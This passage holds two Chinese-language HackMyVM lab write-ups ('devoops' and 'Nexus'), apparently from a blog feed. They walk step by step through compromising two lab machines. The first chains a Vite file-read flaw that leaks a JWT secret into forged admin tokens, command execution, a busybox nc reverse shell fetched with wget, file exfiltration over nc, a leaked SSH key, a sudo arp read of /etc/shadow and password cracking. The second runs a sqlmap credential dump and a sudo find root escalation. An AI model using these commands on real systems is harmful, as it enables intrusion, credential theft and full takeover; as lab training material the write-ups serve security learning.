ÁªßÁª≠ËØªÂèñÂêéÁ´ØÊúçÂä°ÁöÑ‰∏ªÈÄªËæëÊñá‰ª∂ `server.js`„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.149:3000/server.js
...
app.get('/api/sign', (req, res) =&gt; {
    return res.json({
        'status': 'signed',
        'data': jwt.sign({
            uid: -1,
            role: 'guest',
        }, process.env.JWT_SECRET, { expiresIn: '1800s' }),
    });
});

app.get('/api/execute', async (req, res) =&gt; {
...
    try {
        const payload = jwt.verify(jwt_raw, process.env.JWT_SECRET);
        if (payload.role !== 'admin') {
...
    const command = req.query.cmd;

    const is_command_safe = is_safe_command(command);
...
});
...
```

‰ª£Á†ÅÂÆ°ËÆ°ÂèëÁé∞Ôºö

1.  `/api/sign` Êé•Âè£‰ΩøÁî® `process.env.JWT_SECRET` ‰Ωú‰∏∫ÂØÜÈí•ÔºåÁ≠æÂèë‰∏Ä‰∏™ËßíËâ≤‰∏∫ `guest` ÁöÑJWT„ÄÇ
2.  `/api/execute` Êé•Âè£Ë¶ÅÊ±ÇËØ∑Ê±ÇÂ§¥‰∏≠ÂåÖÂê´ÊúâÊïàÁöÑJWTÔºåÂπ∂È™åËØÅÂÖ∂ `role` ÊòØÂê¶‰∏∫ `admin`Ôºå‰πãÂêé‰ºöÊâßË°å `cmd` ÂèÇÊï∞‰º†ÂÖ•ÁöÑÂëΩ‰ª§„ÄÇ

Â∞ΩÁÆ° `vite.config.js` ‰∏≠ÈÖçÁΩÆ‰∫Ü `fs.deny`Ôºå‰ΩÜ Vite Âú®Êüê‰∫õÁâàÊú¨‰∏≠Â≠òÂú®ÁõÆÂΩïÈÅçÂéÜÂíåÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºàÊ≠§Èù∂Êú∫ÁéØÂ¢É‰∏≠‰∏∫**CVE-2025-30208**ÔºâÔºåÂèØ‰ª•ÁªïËøáËØ•ÈôêÂà∂„ÄÇÈÄöËøáÁâπÂÆöpayloadÂèØ‰ª•ËØªÂèñÂà∞ `.env` Êñá‰ª∂ÂÜÖÂÆπ„ÄÇ

&gt; [!Tip]
&gt;
&gt; https://github.com/ThumpBo/CVE-2025-30208-EXP

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl -s 'http://192.168.205.149:3000/opt/node/.env?import&amp;raw??'
export default 'JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&amp;,&lt;,&gt;,ls,cat,pwd,head,tail,grep,xxd'\n'
```

ÊàêÂäüËé∑ÂèñÂà∞ `JWT_SECRET`Ôºö`2942szKG7Ev83aDviugAa6rFpKixZzZz`Ôºå‰ª•ÂèäÂëΩ‰ª§ÊâßË°åÁöÑÈªëÂêçÂçï `COMMAND_FILTER`„ÄÇ

Âà©Áî®Ëé∑ÂèñÂà∞ÁöÑ `JWT_SECRET`ÔºåÊàë‰ª¨ÂèØ‰ª•‰º™ÈÄ†‰∏Ä‰∏™ËßíËâ≤‰∏∫ `admin` ÁöÑJWT„ÄÇÂèØ‰ª•ËÆøÈóÆ [[jwt.cagdastunca.com](https://jwt.cagdastunca.com/)](https://jwt.cagdastunca.com/) ÊàñÂÖ∂‰ªñJWTÂ∑•ÂÖ∑Êù•ÂÆåÊàêÊ≠§Êìç‰Ωú„ÄÇ

**‰º™ÈÄ†ÁöÑPayload:**

```json
{
  'uid': -1,
  'role': 'admin',
  'iat': 1756035331,
  'exp': 1756037131
}
```

**ÁîüÊàêÁöÑAdmin Token:**
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NTYwMzUzMzEsImV4cCI6MTc1NjAzNzEzMX0.meJBbQUW_wJiQBM7FBtF6IIdP0SJrD5Z_tXJoRr6yi0`

‰ΩøÁî®‰º™ÈÄ†ÁöÑTokenÂ∞ùËØïÊâßË°å `id` ÂëΩ‰ª§ÔºåÈ™åËØÅËøúÁ®ã‰ª£Á†ÅÊâßË°åÔºàRCEÔºâÊòØÂê¶ÊàêÂäü„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ADMIN_TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NTYwMzUzMzEsImV4cCI6MTc1NjAzNzEzMX0.meJBbQUW_wJiQBM7FBtF6IIdP0SJrD5Z_tXJoRr6yi0'
      
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl -g -H 'Authorization: Bearer $ADMIN_TOKEN' 'http://192.168.205.149:3000/execute?cmd=id'
{'status':'executed','data':{'stdout':'uid=1000(runner) gid=1000(runner) groups=1000(runner)\n','stderr':''}}
```

ÂëΩ‰ª§ÊàêÂäüÊâßË°åÔºåÂΩìÂâçÁî®Êà∑‰∏∫ `runner`„ÄÇ

# **‰∏â„ÄÅËé∑ÂèñÂèçÂºπShell**

‰∏∫‰∫ÜËé∑Âæó‰∏Ä‰∏™‰∫§‰∫íÂºèÁöÑShellÔºåÊàë‰ª¨ÂáÜÂ§áËøõË°åÂèçÂºπShellÊìç‰Ωú„ÄÇÈÄöËøáÊâßË°å `busybox` ÂëΩ‰ª§ÔºåÂèØ‰ª•Êü•ÁúãÁõÆÊ†áÁ≥ªÁªüÊîØÊåÅÁöÑÂ∑•ÂÖ∑„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl -g -H 'Authorization: Bearer $ADMIN_TOKEN' 'http://192.168.205.149:3000/execute?cmd=busybox'
{'status':'executed','data':{'stdout':'BusyBox v1.37.0 ... \n ... \n\t ... nc, netstat, ... wget, ...\n ...','stderr':''}}
```

ÁõÆÊ†áÁ≥ªÁªüÂ≠òÂú® `busybox nc` Âíå `wget`Ôºå‰∏îÂùáÊú™Ë¢´`COMMAND_FILTER`ËøáÊª§„ÄÇÂèØ‰ª•Âà©Áî®Ëøô‰∫õÂ∑•ÂÖ∑Êù•Ëé∑ÂèñÂèçÂºπShell„ÄÇ

1. Âú®Êú¨Âú∞KaliÊîªÂáªÊú∫‰∏äÂàõÂª∫‰∏Ä‰∏™ÂåÖÂê´ÂèçÂºπShellÂëΩ‰ª§ÁöÑËÑöÊú¨ `sss`„ÄÇ

   ```shell
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ cat sss
   busybox nc 192.168.205.128 8888 -e /bin/ash
   ```

2. Âú®Kali‰∏äÂºÄÂêØ‰∏Ä‰∏™‰∏¥Êó∂ÁöÑHTTPÊúçÂä°ÔºåÁî®‰∫éÈù∂Êú∫‰∏ãËΩΩËÑöÊú¨„ÄÇ

   ```shell
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ python3 -m http.server 80
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```

3. Âú®Kali‰∏ä‰ΩøÁî® `nc` ÁõëÂê¨8888Á´ØÂè£ÔºåÂáÜÂ§áÊé•Êî∂ÂèçÂºπShell„ÄÇ

   ```shell
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ nc -lvnp 8888
   ```

4. ÈÄöËøáRCEÊºèÊ¥ûÔºåÊâßË°å‰∏Ä‰∏≤ÂëΩ‰ª§Ôºö‰∏ãËΩΩËÑöÊú¨(`wget`)ÔºåËµã‰∫àÊâßË°åÊùÉÈôê(`chmod`)ÔºåÁÑ∂ÂêéÊâßË°åËÑöÊú¨„ÄÇ

   ```shell
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ curl -g -H 'Authorization: Bearer $ADMIN_TOKEN' 'http://192.168.205.149:3000/execute?cmd=wget%20192%2E168%2E205%2E128%2Fsss%0Achmod%20%2Bx%20%2E%2Fsss%0A%2E%2Fsss'
   ```

ÊàêÂäüÊé•Êî∂Âà∞ÂèçÂºπShell„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888                     
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 45275
id
uid=1000(runner) gid=1000(runner) groups=1000(runner)
```

# **Âõõ„ÄÅÊ®™ÂêëÁßªÂä®**

Âú®Ëé∑ÂæóÁöÑShell‰∏≠ËøõË°å‰ø°ÊÅØÊî∂ÈõÜÔºåÂèëÁé∞ `/opt` ÁõÆÂΩï‰∏ãÂ≠òÂú®‰∏Ä‰∏™ `gitea` ÁõÆÂΩïÔºåÂÖ∂‰∏≠ÂåÖÂê´‰∏Ä‰∏™Âêç‰∏∫ `node.git` ÁöÑgit‰ªìÂ∫ì„ÄÇ

```shell
...
cd /opt/gitea/git/hana
ls -al
total 12
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 .
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 ..
drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 node.git
```

‰∏∫‰∫ÜÊ∑±ÂÖ•ÂàÜÊûêÔºåÊàë‰ª¨Â∞ÜÊï¥‰∏™ `node.git` ‰ªìÂ∫ìÊâìÂåÖÂπ∂‰º†ÂõûKaliÊîªÂáªÊú∫„ÄÇ

1. Âú®Èù∂Êú∫‰∏äÔºåÂ∞Ü `node.git` ÁõÆÂΩïÊâìÂåÖ„ÄÇ

   ```shell
   busybox tar -cf /tmp/1.tar node.git
   ```

2. Âú®Kali‰∏äÁõëÂê¨1234Á´ØÂè£ÔºåÂπ∂Â∞ÜÊé•Êî∂Âà∞ÁöÑÊï∞ÊçÆ‰øùÂ≠ò‰∏∫ `1.tar`„ÄÇ

   ```shell
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ nc -lvnp 1234 &gt; 1.tar
   ```

3. Âú®Èù∂Êú∫‰∏äÔºå‰ΩøÁî® `nc` Â∞ÜÊâìÂåÖÂ•ΩÁöÑÊñá‰ª∂ÂèëÈÄÅÂà∞Kali„ÄÇ

   ```shell
   cat 1.tar|busybox nc 192.168.205.128 1234
   ```

Êñá‰ª∂‰º†ËæìÂÆåÊàêÂêéÔºåÂú®Kali‰∏äËß£ÂéãÂπ∂ÂàÜÊûêgit‰ªìÂ∫ìÁöÑÂéÜÂè≤ËÆ∞ÂΩï„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ tar -xf 1.tar
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cd node.git 
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/node.git]
‚îî‚îÄ$ git log -p
```

`git log -p` ÁöÑËæìÂá∫ÊòæÁ§∫‰∫Ü‰∏Ä‰∏™ÈùûÂ∏∏ÂÖ≥ÈîÆÁöÑÊèê‰∫§ÂéÜÂè≤ÔºöÂºÄÂèëËÄÖÊõæÈîôËØØÂú∞Â∞Ü‰∏Ä‰∏™SSHÁßÅÈí• `id_ed25519` Êèê‰∫§Âà∞‰ªìÂ∫ìÔºåÈöèÂêéÂèàÂú®‰∏ã‰∏ÄÊ¨°Êèê‰∫§‰∏≠Â∞ÜÂÖ∂Âà†Èô§„ÄÇ

```diff
commit 1994a70bbd080c633ac85a339fd85a8635c63893 (HEAD -&gt; main)
Author: azwhikaru &lt;37921907+azwhikaru@users.noreply.github.com&gt;
Date:   Mon Apr 21 14:36:12 2025 +0800

    del: oops!

diff --git a/id_ed25519 b/id_ed25519
deleted file mode 100644
index a2626a4..0000000
--- a/id_ed25519
+++ /dev/null
@@ -1,7 +0,0 @@
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
-5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
-AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
-WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
------END OPENSSH PRIVATE KEY-----
```

‰ªédiff‰ø°ÊÅØ‰∏≠ÊèêÂèñÁßÅÈí•ÂÜÖÂÆπÂπ∂ËøòÂéü„ÄÇÂú®ÂèçÂºπShell‰∏≠ÔºåÈÄöËøá`netstat -lntup`ÂèëÁé∞SSHÊúçÂä°‰ªÖÁõëÂê¨Âú®`127.0.0.1:22`ÔºåÊó†Ê≥ï‰ªéÂ§ñÈÉ®Áõ¥Êé•ËÆøÈóÆ„ÄÇ

```shell
netstat -lntup
Active Internet connections (only servers)
...          
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -                   
...
```

‰∏∫‰∫ÜËÉΩÂ§ü‰ΩøÁî®Ëé∑ÂèñÂà∞ÁöÑÁßÅÈí•ÁôªÂΩïÔºåÈúÄË¶ÅÂú®Èù∂Êú∫‰∏äËøõË°åÁ´ØÂè£ËΩ¨ÂèëÔºåÂ∞ÜÂÜÖÈÉ®ÁöÑSSHÊúçÂä°Êö¥Èú≤ÁªôÊîªÂáªÊú∫„ÄÇËøôÈáå‰ΩøÁî®`socat`Â∞Ü2222Á´ØÂè£ÁöÑÊµÅÈáèËΩ¨ÂèëËá≥127.0.0.1:22„ÄÇ

```shell
socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:22 &amp;
```

Áé∞Âú®ÔºåÂèØ‰ª•‰ΩøÁî®ÁßÅÈí•ÈÄöËøá2222Á´ØÂè£SSHÁôªÂΩï`hana`Áî®Êà∑„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ # ... (ËøòÂéüÁßÅÈí•Âà∞ /tmp/id_rsa) ...
                                                                                   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ sed -i 's/^-//' id_rsa                                                                                          
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ chmod 600 id_rsa
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ ssh hana@192.168.205.149 -p 2222 -i /tmp/id_rsa
...
devoops:~$ id
uid=1001(hana) gid=100(users) groups=100(users),100(users)
```

ÊàêÂäü‰ª• `hana` Áî®Êà∑Ë∫´‰ªΩÁôªÂΩï„ÄÇ

# **‰∫î„ÄÅÊùÉÈôêÊèêÂçá**

ÁôªÂΩï `hana` Áî®Êà∑ÂêéÔºåÊ£ÄÊü•ÂÖ∂ `sudo` ÊùÉÈôê„ÄÇ

```shell
devoops:~$ sudo -l
Matching Defaults entries for hana on devoops:
...
User hana may run the following commands on devoops:
    (root) NOPASSWD: /sbin/arp
```

ÁªìÊûúÊòæÁ§∫ `hana` Áî®Êà∑ÂèØ‰ª•Êó†ÂØÜÁ†Å‰ª•rootÊùÉÈôêÊâßË°å `/sbin/arp` ÂëΩ‰ª§„ÄÇËøôÊòØ‰∏Ä‰∏™Â∑≤Áü•ÁöÑÂèØË¢´Âà©Áî®‰∫éÊèêÊùÉÁöÑÈÖçÁΩÆ„ÄÇÊü•ËØ¢ [[GTFOBins](https://gtfobins.github.io/gtfobins/arp/#sudo)](https://gtfobins.github.io/gtfobins/arp/#sudo) ÂèØÁü•Ôºå`arp` ÂëΩ‰ª§ÁöÑ `-f` ÂèÇÊï∞ÂèØ‰ª•Âä†ËΩΩ‰∏Ä‰∏™Êñá‰ª∂ÔºåÂ¶ÇÊûúÊåáÂÆöÁöÑÊñá‰ª∂‰∏çÂ≠òÂú®ÊàñÊ†ºÂºèÈîôËØØÔºåÂÆÉ‰ºöÂ∞ùËØïÈÄêË°åËØªÂèñÂπ∂ÊòæÁ§∫Êñá‰ª∂ÂÜÖÂÆπÔºå‰ªéËÄåÂÆûÁé∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñ„ÄÇ

Âà©Áî®Ê≠§ÁâπÊÄßËØªÂèñ `/etc/shadow` Êñá‰ª∂ÔºåËé∑ÂèñrootÁî®Êà∑ÁöÑÂØÜÁ†ÅÂìàÂ∏å„ÄÇ

```shell
devoops:~$ sudo arp -v -f /etc/shadow
&gt;&gt; root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
....
```

Â∞ÜËé∑ÂèñÂà∞ÁöÑrootÁî®Êà∑ÂìàÂ∏å‰øùÂ≠òÂà∞Êú¨Âú∞Êñá‰ª∂ÔºåÂπ∂‰ΩøÁî® `john` ÂíåÂ≠óÂÖ∏ËøõË°åÁ†¥Ëß£„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ echo 'root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.' &gt; hash
                          
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ john --wordlist=xato-net-10-million-passwords.txt hash
...
eris             (root)     
...
Session completed. 
```

ÊàêÂäüÁ†¥Ëß£Âá∫rootÂØÜÁ†Å‰∏∫ `eris`„ÄÇ

# **ÂÖ≠„ÄÅËé∑ÂèñFlag**

‰ΩøÁî®Á†¥Ëß£Âá∫ÁöÑÂØÜÁ†ÅÂàáÊç¢Âà∞ `root` Áî®Êà∑ÔºåÊèêÊùÉÂÆåÊàê„ÄÇ

```shell
devoops:~$ su -
Password: 
devoops:~#
```

ÊúÄÂêéÔºåÂú® `root` Âíå `hana` ÁöÑÂÆ∂ÁõÆÂΩï‰∏≠ÊâæÂà∞Âπ∂ËØªÂèñflagÊñá‰ª∂„ÄÇ

```shell
devoops:~# cat /root/R007.7x7oOoOoOoOoOoO /home/hana/user.flag 
flag{a834296543f4c2990909ce1c56becfba}
flag{03d0e150ae9fc686a827b41e1969d497}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_devoops.html</guid><pubDate>Sun, 24 Aug 2025 12:10:24 +0000</pubDate></item><item><title>hmv_Nexus</title><link>https://7r1UMPHK.github.io/post/hmv_Nexus.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

È¶ñÂÖàÔºåÂú®ÂΩìÂâçÁΩëÊÆµÂÜÖËøõË°å‰∏ªÊú∫ÂèëÁé∞ÔºåÁ°ÆÂÆöÁõÆÊ†áÈù∂Êú∫ÁöÑIPÂú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.132 08:00:27:99:80:8f       PCS Systemtechnik GmbH
...
```

ÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.132`„ÄÇ

Êé•‰∏ãÊù•Ôºå‰ΩøÁî®NmapÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•Êé¢ÊµãÂÖ∂ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 05:04 EDT
Nmap scan report for novice.com (192.168.205.132)
Host is up (0.00017s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:99:80:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†áÂºÄÊîæ‰∫Ü `22` (SSH) Âíå `80` (HTTP) ‰∏§‰∏™Á´ØÂè£„ÄÇÊàë‰ª¨‰ªéWebÊúçÂä°ÂÖ•Êâã„ÄÇ

# ‰∫å„ÄÅWebÊ∏óÈÄè

ËÆøÈóÆÁõÆÊ†á `http://192.168.205.132`ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™ÈùôÊÄÅÂõæÁâáÂ±ïÁ§∫È°µÈù¢ÔºåÊ≤°ÊúâÂèØ‰∫§‰∫íÁöÑÂäüËÉΩÁÇπ„ÄÇÂõ†Ê≠§ÔºåÂÜ≥ÂÆöËøõË°åÁõÆÂΩïÁàÜÁ†¥Êù•ÂèëÁé∞Êõ¥Â§ö‰ø°ÊÅØ„ÄÇ

‰ΩøÁî® `gobuster` ËøõË°åÁõÆÂΩïÊâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.132 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -t 64
===============================================================
...
[+] Url:                     http://192.168.205.132
...
===============================================================
/index.html           (Status: 200) [Size: 825]
/login.php            (Status: 200) [Size: 352]
/index2.php           (Status: 200) [Size: 75134]
/server-status        (Status: 403) [Size: 280]
...
===============================================================
```

Êâ´ÊèèÂèëÁé∞‰∫Ü `index2.php` Âíå `login.php`„ÄÇËÆøÈóÆ `index2.php`ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™ÂäüËÉΩÂ§çÊùÇÁöÑ‰ªøÈªëÂÆ¢‰∫§‰∫íÂºèÈ°µÈù¢„ÄÇÂú®È°µÈù¢ÁöÑ 'CRYPTO' Ê®°Âùó‰∏≠ÔºåÊâæÂà∞‰∫Ü‰∏ÄÊÆµÂçÅÂÖ≠ËøõÂà∂ÁºñÁ†ÅÁöÑÂ≠óÁ¨¶‰∏≤Ôºö

```
48 6f 6c 61 20 41 6c 69 74 61 2c 20 ... 6c 61 20 72 65 64 2e
```

‰ΩøÁî® CyberChef Â∞ÜÂÖ∂ËΩ¨Êç¢‰∏∫ÊñáÊú¨ÔºåÂæóÂà∞‰ª•‰∏ã‰ø°ÊÅØÔºö

&gt; Âó®ÔºåAlitaÔºåÂ∏åÊúõ‰Ω†Ê≠£Âú®ËØªËøôÊù°Âä†ÂØÜ‰ø°ÊÅØ„ÄÇË¶ÅÁ†¥Ëß£Á≥ªÁªüÔºå‰Ω†ÈúÄË¶Å‰ΩøÁî®ÊàëËß£ÈáäËøáÁöÑÊäÄÊúØ„ÄÇÊàëÂ∑≤ÁªèÊääËÆøÈóÆ‰ª£Á†ÅÂíåÈ™åËØÅÁ†Å‚Äúpandora‚ÄùÁªô‰∫Ü‰Ω†„ÄÇÁ∫ø‰∏äËßÅ„ÄÇ

ËôΩÁÑ∂ÂæóÂà∞‰∫Ü ‚Äúpandora‚Äù Ëøô‰∏™ÂÖ≥ÈîÆ‰ø°ÊÅØÔºå‰ΩÜÂΩìÊó∂Âπ∂Êú™ÂÆåÂÖ®ÁêÜËß£ÂÖ∂Áî®ÈÄî„ÄÇ

ÁªßÁª≠Êé¢Á¥¢ `index2.php` ÁöÑÂÖ∂‰ªñÊ®°ÂùóÔºåÂú® 'NEXUS' Ê®°Âùó‰∏≠ÂèëÁé∞‰∫Ü‰∏ÄÊù°ÈáçË¶ÅÁöÑÊèêÁ§∫‰ø°ÊÅØÔºåÊåáÂêë‰∫Ü‰∏Ä‰∏™Êñ∞ÁöÑÁôªÂΩïË∑ØÂæÑÔºö

![image-20250824172310725](http://7r1UMPHK.github.io/image/20250824174142762.webp)

`NEXUS MSG&gt; _ AUTHORIZATION PANEL :: http://[personal ip]/auth-login.php`

ËÆøÈóÆ `http://192.168.205.132/auth-login.php`ÔºåÂèëÁé∞‰∏Ä‰∏™ÁôªÂΩïÊ°Ü„ÄÇÂ∞ùËØïËæìÂÖ• `admin` Âπ∂Âú®ÂØÜÁ†ÅÊ°Ü‰∏≠ËæìÂÖ•‰∏Ä‰∏™ÂçïÂºïÂè∑ `'`ÔºåÈ°µÈù¢ËøîÂõû‰∫ÜSQLÈîôËØØÔºåË°®ÊòéÊ≠§Â§ÑÂ≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇ

‰ΩøÁî® `sqlmap` ÂØπËØ•ÁôªÂΩïË°®ÂçïËøõË°åËá™Âä®ÂåñÊ≥®ÂÖ•ÊîªÂáªÔºö

```bash
sqlmap -u 'http://192.168.205.132/auth-login.php' --batch --forms --dump
```

`sqlmap` ÊàêÂäüËØÜÂà´Âπ∂Âà©Áî®‰∫ÜÊ≥®ÂÖ•ÁÇπÔºå‰ªéÊï∞ÊçÆÂ∫ì‰∏≠ dump Âá∫‰∫Ü `users` Ë°®ÁöÑÂÜÖÂÆπÔºö

```
...
Database: sion
Table: users
[2 entries]
+----+--------------------+----------+
| id | password           | username |
+----+--------------------+----------+
| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |
| 2  | cambiame08         | admin    |
+----+--------------------+----------+
...
```

Êàë‰ª¨Ëé∑Âæó‰∫Ü‰∏ÄÁªÑÊúâÊïàÁöÑÂá≠ËØÅÔºö`shelly` / `F4ckTh3F4k3H4ck3r5`„ÄÇ

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

Âà©Áî®‰∏ä‰∏ÄÊ≠•Ëé∑ÂèñÁöÑÂá≠ËØÅÔºåÈÄöËøáSSHÁôªÂΩïÁõÆÊ†á‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh shelly@192.168.205.132
shelly@192.168.205.132's password: F4ckTh3F4k3H4ck3r5

... Welcome Banner ...

shelly@NexusLabCTF:~$ id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly)...
```

ÁôªÂΩïÊàêÂäüÂêéÔºåÁ´ãÂç≥Ê£ÄÊü•ÂΩìÂâçÁî®Êà∑ÁöÑ `sudo` ÊùÉÈôê„ÄÇ

```bash
shelly@NexusLabCTF:~$ sudo -l
...
User shelly may run the following commands on NexusLabCTF:
    (ALL) NOPASSWD: /usr/bin/find
```

ÁªìÊûúÊòæÁ§∫Ôºå`shelly` Áî®Êà∑ÂèØ‰ª•Êó†ÈúÄÂØÜÁ†Å‰ª• `root` ÊùÉÈôêÊâßË°å `/usr/bin/find` ÂëΩ‰ª§„ÄÇ`find` ÂëΩ‰ª§ÂèØ‰ª•ÈÄöËøá `-exec` ÂèÇÊï∞ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ÔºåËøôÊòØ‰∏Ä‰∏™ÁªèÂÖ∏ÁöÑÊèêÊùÉÂêëÈáè„ÄÇ

Âà©Áî® `find` ÂëΩ‰ª§ÊèêÊùÉËá≥ `root`Ôºö

```bash
shelly@NexusLabCTF:~$ sudo find . -exec /bin/bash \; -quit
root@NexusLabCTF:/home/shelly# id
uid=0(root) gid=0(root) groups=0(root)
```

ÊàêÂäüËé∑Âèñ `root` ÊùÉÈôê„ÄÇÈ¶ñÂÖàÔºåËØªÂèñÁî®Êà∑ flagÔºö

```bash
root@NexusLabCTF:/home/shelly# cat /home/shelly/SA/user-flag.txt 
...
HackMyVM
Flag User ::  82kd8FJ5SJ00HMVUS3R36gd
```

# Âõõ„ÄÅÊúÄÁªàFlagËé∑Âèñ

Âú® `root` Áî®Êà∑ÁöÑÂÆ∂ÁõÆÂΩï‰∏ãÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `Sion-Code` ÁöÑÁõÆÂΩïÔºåÂÖ∂‰∏≠ÂåÖÂê´‰∏Ä‰∏™ÂõæÁâáÊñá‰ª∂ `use-fim-to-root.png`„ÄÇÊñá‰ª∂ÂêçÊöóÁ§∫‰∫ÜÊúÄÁªàÁöÑ flag ÂèØËÉΩ‰∏éËøô‰∏™Êñá‰ª∂ÊúâÂÖ≥„ÄÇ

‰∏∫‰∫ÜÊñπ‰æøÂàÜÊûêÔºå‰ΩøÁî® `scp` Â∞ÜËØ•ÂõæÁâáÊñá‰ª∂‰º†Âõû Kali ÊîªÂáªÊú∫„ÄÇ

```bash
# Âú®Èù∂Êú∫‰∏äÊâßË°å
root@NexusLabCTF:~/Sion-Code# scp use-fim-to-root.png kali@192.168.205.128:/mnt/hgfs/gx/x
...
use-fim-to-root.png                                     100%   71KB  19.7MB/s   00:00
```

![use-fim-to-root](http://7r1UMPHK.github.io/image/20250824174140496.webp)

